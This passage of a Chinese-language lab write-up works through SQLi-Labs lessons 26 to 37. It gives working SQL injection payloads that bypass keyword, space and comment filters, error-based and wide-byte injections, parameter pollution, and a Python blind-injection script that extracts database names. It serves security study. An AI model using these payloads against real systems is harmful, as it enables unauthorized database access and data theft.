+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-26/?id=1&#x27;%a0and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p>发现还过滤了and:<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121048633.png"><br>用之前的思路绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-26/?id=1&#x27;%a0aandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121048237.png"><br>构造如下payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-26/?id=0&#x27;%a0union%a0select%a01,database(),2%a0anandd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121054005.png"><br>需要注意的是：之前使用id=-1来使前面的查询语句为false，但如果这关使用id=-1会发现爆不出库名，原因是过滤了注释符号<code>--</code><br>这里有一种使用and的构造方法：使用<code>||</code>符号，<code>||</code>用来在SQL语句中连接多个字段，用法如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,字段<span class="number">1</span><span class="operator">||</span>字段<span class="number">2.</span>..<span class="operator">||</span>字段n</span><br></pre></td></tr></table></figure>
+<p>那就可以构造这样的payload，以防and被递归过滤的情况：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-26/?id=0&#x27;%a0union%a0select%a01,database(),2%a0||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p>后续的步骤与之前类似</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>这道题还可以使用基于<code>updatexml()</code>的报错注入：</p>
+<h3 id="库名："><a href="#库名：" class="headerlink" title="库名："></a>库名：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-26/?id=0&#x27;||updatexml(1,concat(&#x27;^&#x27;,(database())),0)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121106175.png"><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121106762.png"></p>
+<h3 id="表名："><a href="#表名：" class="headerlink" title="表名："></a>表名：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-26/?id=0&#x27;||updatexml(1,concat(&#x27;^&#x27;,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#x27;security&#x27;)),0)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121112264.png"><br>需要注意的是：这里还过滤了<code>or</code>，所以<code>information_schema</code>要写为<code>infoorrmation_schema</code><br>不使用空格的写法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-26/?id=0&#x27;||updatexml(1,concat(&#x27;^&#x27;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;))),0)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p>剩下的与之前类似，不再赘述</p>
+<h1 id="Lesson-26a"><a href="#Lesson-26a" class="headerlink" title="Lesson 26a"></a>Lesson 26a</h1><p><strong>GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)</strong><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121615843.png"><br>过滤方式和Less-26一样，只是不再输出报错，盲注一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-26a/?id=1&#x27;%a0anandd%a0substr(database(),1,1)=&#x27;s</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121619994.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-26a/?id=1&#x27;%a0anandd%a0substr(database(),1,1)=&#x27;a</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121619606.png"><br>编写脚本爆库名：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://127.0.0.1/Less-26a/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Your Login name&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_len</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        payload = <span class="string">&quot;?id=1&#x27;%a0anandd%a0length(database())=\</span></span><br><span class="line"><span class="string">        &#123;0&#125;%a0anandd%a0&#x27;1&#x27;=&#x27;1&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        r = requests.get(URL + payload)</span><br><span class="line">        <span class="keyword">if</span>(flag <span class="keyword">in</span> r.text):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name</span>(<span class="params">length</span>):</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">            char = <span class="built_in">chr</span>(<span class="number">97</span>+j)</span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27;%a0anandd%a0substr(database(),\</span></span><br><span class="line"><span class="string">            &#123;0&#125;,1)=&#x27;&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(i,char)</span><br><span class="line">            r = requests.get(URL + payload)</span><br><span class="line">            <span class="keyword">if</span>(flag <span class="keyword">in</span> r.text):</span><br><span class="line">                name += char</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(db_name(db_len()))</span><br></pre></td></tr></table></figure>
+<p>输出如下：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211121844734.png"><br>剩下的简单修改脚本即可</p>
+<h1 id="Lesson-27"><a href="#Lesson-27" class="headerlink" title="Lesson 27"></a>Lesson 27</h1><p><strong>GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的基于错误的注入）</strong><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211131828909.png"><br>根据题目，过滤了<code>Union</code>和<code>select</code>，利用大小写绕过爆库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-27/?id=0&#x27;%a0UnioN%a0SeLect%a01,database(),2%a0and%a0&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211141236272.png"><br>其余与前面相同，除了基于正确注入，还可以基于报错注入和Bool盲注</p>
+<h2 id="过滤代码"><a href="#过滤代码" class="headerlink" title="过滤代码"></a>过滤代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">blacklist</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$hint</span> = <span class="variable">$id</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);       <span class="comment">//strip out /*</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);         <span class="comment">//Strip out --.</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);          <span class="comment">//Strip out #.</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);         <span class="comment">//Strip out spaces.</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);      <span class="comment">//Strip out spaces.</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);         <span class="comment">//Strip out spaces.</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);       <span class="comment">//Strip out union</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);      <span class="comment">//Strip out select</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);       <span class="comment">//Strip out UNION</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);      <span class="comment">//Strip out SELECT</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);       <span class="comment">//Strip out Union</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);      <span class="comment">//Strip out select</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Lesson-27a"><a href="#Lesson-27a" class="headerlink" title="Lesson 27a"></a>Lesson 27a</h1><p><strong>GET - Blind Based- All your UNION &amp; SELECT belong to us - Double Quotes （过滤了union和select的盲注）</strong><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211141248472.png"><br>这一关与前面的区别只是将单引号改为了双引号闭合，并且只能盲注，基于26a将过滤的字符大小写绕过一下即可</p>
+<h1 id="Lesson-28"><a href="#Lesson-28" class="headerlink" title="Lesson 28"></a>Lesson 28</h1><p><strong>GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入</strong><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211141651758.png"><br>根据题目，闭合方式为单引号有括号，尝试下面的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-28/?id=1&#x27;);%00</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211141851090.png"><br>这里使用<code>%00</code>将后面的语句截断<br>爆库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-28/?id=0&#x27;)%a0Union%a0select%a01,database(),3;%00</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211141854580.png"><br>其余的与之前类似，也可以使用盲注</p>
+<h2 id="过滤代码-1"><a href="#过滤代码-1" class="headerlink" title="过滤代码"></a>过滤代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">blacklist</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$hint</span> = <span class="variable">$id</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);               <span class="comment">//strip out /*</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);                 <span class="comment">//Strip out --.</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);                  <span class="comment">//Strip out #.</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);                 <span class="comment">//Strip out spaces.</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);                 <span class="comment">//Strip out spaces.</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);      <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Lesson-28a"><a href="#Lesson-28a" class="headerlink" title="Lesson 28a"></a>Lesson 28a</h1><p>这道题与Less28没有太大区别，只是变成了盲注，过滤条件比上题还松一点</p>
+<h2 id="过滤代码-2"><a href="#过滤代码-2" class="headerlink" title="过滤代码"></a>过滤代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);				//strip out /*</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);				//Strip out --.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);					//Strip out #.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);	    		//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);	    		//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>除了最后一行其他全都过滤掉了</p>
+<h1 id="Lesson-29"><a href="#Lesson-29" class="headerlink" title="Lesson 29"></a>Lesson 29</h1><p>Lesson29-31这几关主要涉及的是两层服务器的情况，题目并不困难，问题是Tomcat环境的配置，我是用docker跑的sqli-labs，主要参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43579362/article/details/104298144">这篇文章</a>进行配置，博主讲的很详细，我不再赘述<br>需要注意的是，如果和我一样使用docker搭建环境，那需要重新开一个容器，并添加容器内8080端口和80端口的映射，环境配置好之后还需要修改index.jsp文件，因为我是基于<code>acgpiano/sqli-labs</code>这个镜像配置的，所以和默认的index.jsp中链接路径有所不同<br>回到题目：<br>使用一个参数注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:12345/sqli-labs/Less-29/index.jsp?id=1&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161345710.png"><br>就会触发WAF，这是因为Tomcat服务器解析了这个参数并返回，关于服务器的两层架构，参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/p/5762961.html">这篇文章</a><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161341745.png"><br>这里的中间服务器是Tomcat，所以Tomcat会解析第一个参数，然后Tomcat去请求apache，apache会解析最后一个参数，而最后返回的参数也是apache处理的参数，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:12345/sqli-labs/Less-29/index.jsp?id=1&amp;id=2</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161343883.png"><br>这样我们就可以使用第二个参数进行注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:12345/sqli-labs/Less-29/index.jsp?id=1&amp;id=2&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161349451.png"><br>报错，剩下的就很简单了，因为本题主要考察的是参数污染，所以注入部分参考之前的就可以</p>
+<h1 id="Lesson-30-31"><a href="#Lesson-30-31" class="headerlink" title="Lesson 30~31"></a>Lesson 30~31</h1><p>Lesson 29的盲注版本和带括号版本，除此之外和Lesson 29一模一样，不再赘述</p>
+<h1 id="Lesson-32"><a href="#Lesson-32" class="headerlink" title="Lesson 32"></a>Lesson 32</h1><p><strong>GET - Bypass custom filter adding slashes to dangerous chars 对危险字符添加反斜线过滤</strong><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161738095.png"><br>本题考察宽字节注入，相关知识参考：<a target="_blank" rel="noopener" href="https://zgao.top/mysql%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">https://zgao.top/mysql%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</a><br>加个单引号先测试一波：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-32/?id=1&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161739401.png"><br>发现后端将单引号加了反斜线，直接使用<code>%df</code>绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-32/?id=0%df&#x27;union select 1,database(),2--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161753177.png"><br>成功绕过，这里使用注入<code>%df</code>后，由于反斜杠编码后是<code>%5c</code>，所以参数传入代码层后会变为<code>%df%5c%27</code>，而mysql在解析<code>%df%5c</code> 时会将其看作一个宽字节，它认为两个字节就是GBK编码表示的汉字，这里是“運”，从而使反斜线失去了效果，这里只要第一个字节大于128即可<br>后续注入与前面一样，不再赘述</p>
+<h1 id="Lesson-33"><a href="#Lesson-33" class="headerlink" title="Lesson 33"></a>Lesson 33</h1><p><strong>基于错误_GET_单引号_字符型_addslashes()_宽字节注入</strong><br>这一关使用了addslashes()函数进行过滤，其在特定的字符前加入反斜杠进行转义：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">单引号 &#x27;</span><br><span class="line">双引号 &quot;</span><br><span class="line">反斜杠 \</span><br><span class="line">空字符 NULL</span><br></pre></td></tr></table></figure>
+<p>其余与Lesson32完全相同</p>
+<h1 id="Lesson-34"><a href="#Lesson-34" class="headerlink" title="Lesson 34"></a>Lesson 34</h1><p><strong>基于POST方法的反斜线Bypass</strong><br>本题考察问题和Less-33一致，同样可以使用宽字节注入，只是参数提交方法变为了POST，burp抓包重放即可，这里使用报错注入：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161924337.png"><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161924541.png"></p>
+<h1 id="Lesson-35"><a href="#Lesson-35" class="headerlink" title="Lesson 35"></a>Lesson 35</h1><p><strong>基于错误的GET型，数字型宽字节注入</strong><br>既然是数字型，那不需要单引号来闭合，直接就可以利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-35/?id=-1 union select 1,database(),3  --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211161937883.png"></p>
+<h1 id="Lesson-36"><a href="#Lesson-36" class="headerlink" title="Lesson 36"></a>Lesson 36</h1><p><strong>基于错误的GET型，单引号字符型，mysql-real-escape-string()宽字节注入</strong></p>
+<h2 id="mysql-real-escape-string-函数"><a href="#mysql-real-escape-string-函数" class="headerlink" title="mysql-real-escape-string()函数"></a>mysql-real-escape-string()函数</h2><p>这关使用<code>mysql-real-escape-string()</code>函数进行过滤，其作用是转义SQL语句中使用的字符串中的特殊字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br></pre></td></tr></table></figure>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string(_string_,_connection_)</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>string</td>
+<td>必需。规定要转义的字符串。</td>
+</tr>
+<tr>
+<td>connection</td>
+<td>可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</td>
+</tr>
+<tr>
+<td>这个函数也可以直接使用宽字节注入：</td>
+<td></td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-36/?id=0%df&#x27;union select 1,database(),2 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211162004960.png"></p>
+<h1 id="Lesson-37"><a href="#Lesson-37" class="headerlink" title="Lesson 37"></a>Lesson 37</h1><p>Lesson 36的POST版本<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211162009090.png"><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202211162009242.png"></p>
+
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2022/11/21/SQLi-Labs%20Stacked%20Injection/" title="SQLi-Labs靶场刷题记录【Stacked Challenges】">
+                    <div class="nextTitle">SQLi-Labs靶场刷题记录【Stacked Challenges】</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2022/11/21/SQLi-Labs%20%20Challenges/" title="SQLi-Labs靶场刷题记录【Challenges】">
+                    <div class="prevTitle">SQLi-Labs靶场刷题记录【Challenges】</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:mark765111@aliyun.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/r4x7651" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.zhihu.com/people/bing-huo-7651" class="iconfont-archer zhihu" target="_blank" title=zhihu></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://space.bilibili.com/290770601" class="iconfont-archer bilibili" target="_blank" title=bilibili></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
